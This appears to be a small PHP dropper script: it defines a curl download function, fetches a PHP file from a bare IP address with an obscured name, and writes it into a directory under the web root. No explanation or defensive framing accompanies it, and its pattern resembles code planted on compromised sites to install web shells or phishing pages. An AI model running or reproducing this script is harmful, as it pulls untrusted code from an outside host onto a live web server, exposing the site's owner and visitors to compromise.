<?php

function download($url) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  
  $result = curl_exec($ch);

  curl_close($ch);
  return($result);
}

$contents = download('http://85.208.136.33/kjzdnfv_send_setup2.php');
file_put_contents('/var/www/html/batushka/mixinte', $contents);